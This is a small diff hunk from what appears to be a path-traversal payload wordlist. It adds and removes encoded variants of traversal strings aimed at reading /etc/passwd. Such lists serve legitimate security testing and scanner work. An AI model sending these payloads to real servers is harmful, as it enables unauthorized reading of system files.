@@ -41,8 +41,5 @@ etc%255cpasswd
 etc%252fpasswd
 etc%%35%63passwd
 etc%%32%66passwd
-\etc/passwd
-/etc/passwd
-/..;/etc/passwd
-.//etc/passwd
 ..;/etc/passwd
+.//etc/passwd
